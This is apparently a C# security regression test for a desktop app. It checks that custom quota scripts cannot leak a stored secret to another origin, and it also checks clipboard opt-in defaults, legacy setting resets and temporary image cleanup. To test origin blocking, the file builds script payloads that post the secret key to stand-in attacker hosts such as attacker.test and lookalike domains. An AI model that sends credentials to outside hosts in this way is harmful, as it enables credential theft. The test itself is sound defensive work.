using System.Net;
using System.Text.Json;
using BrimDeck.Core;

internal static class SecurityRegressionTests
{
    public static async Task Run(string root, Action<string, bool> check)
    {
        var entry = new AppEntry { QuotaSource = ProviderId.Custom, Site = "https://api.example.test/base" };
        using var handler = new Requests();
        using var http = new HttpClient(handler);
        using var providers = new ConfiguredProviders(new Secrets(), http);
        foreach (var destination in new[] { "https://attacker.test/collect", "https://api.example.test.attacker.test/collect",
            "https://child.api.example.test/collect", "https://api.example.test:444/collect", "http://api.example.test/collect" })
        {
            entry.AllowHttp = true;
            entry.Script = "async function fetchUsage(ctx) { await ctx.http.post(" + JsonSerializer.Serialize(destination) +
                ", {body:{key:ctx.secrets.key}}); return [{title:'quota',percent:1}]; }";
            var before = handler.Count;
            var result = await providers.TestAsync(entry);
            check("custom script refuses a different origin before sending credentials: " + destination,
                !result.Snapshot.LiveQuota && handler.Count == before && !result.Snapshot.Status.Contains("fixture-secret"));
        }
        entry.AllowHttp = false;
        entry.Script = "async function fetchUsage(ctx) { await ctx.http.get('https://API.example.test:443/usage'); return [{title:'quota',percent:1}]; }";
        check("a script may query another path at its configured origin", (await providers.TestAsync(entry)).Snapshot.LiveQuota && handler.Count == 1);
        entry.Site = "";
        check("a network script without an approved site makes no request", !(await providers.TestAsync(entry)).Snapshot.LiveQuota && handler.Count == 1);
        entry.Script = "function fetchUsage(ctx) { return [{title:'offline',percent:1}]; }";
        check("an offline script does not need a site", (await providers.TestAsync(entry)).Snapshot.LiveQuota);

        check("new settings and older files without consent leave clipboard recording off",
            !new DeckSettings().ClipboardRecord && !JsonSerializer.Deserialize<DeckSettings>("{}")!.ClipboardRecord);
        check("an existing explicit clipboard opt-in is preserved", JsonSerializer.Deserialize<DeckSettings>("{\"ClipboardRecord\":true}")!.ClipboardRecord);
        var legacy = new DeckSettings { NeteaseFullControlEntry = true, NeteaseAutoFullControl = true, NeteaseFullControl = true, KugouFullControl = true };
        legacy.Normalize();
        check("legacy settings cannot reactivate player debugging or permanent patches",
            !legacy.NeteaseFullControlEntry && !legacy.NeteaseAutoFullControl && !legacy.NeteaseFullControl && !legacy.KugouFullControl);
        var folder = Path.Combine(root, "drag-pictures"); Directory.CreateDirectory(folder);
        var old = Path.Combine(folder, "old.png"); var recent = Path.Combine(folder, "recent.png"); var unrelated = Path.Combine(folder, "keep.txt");
        File.WriteAllText(old, "image"); File.WriteAllText(recent, "image"); File.WriteAllText(unrelated, "keep");
        File.SetLastWriteTimeUtc(old, DateTime.UtcNow.AddHours(-1));
        TemporaryPictures.Clear(folder, DateTime.UtcNow.AddMinutes(-10));
        check("drag expiry removes old images while retaining a recent drop", !File.Exists(old) && File.Exists(recent));
        TemporaryPictures.Clear(folder);
        check("startup cleanup removes crash leftovers without deleting unrelated files", !File.Exists(recent) && File.Exists(unrelated));
    }

    private sealed class Secrets : IProviderSecrets
    {
        public string Read(Guid id) => "fixture-secret";
        public void Write(Guid id, string secret) { }
        public void Delete(Guid id) { }
    }
    private sealed class Requests : HttpMessageHandler
    {
        public int Count { get; private set; }
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        { Count++; return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent("{}") }); }
    }
}
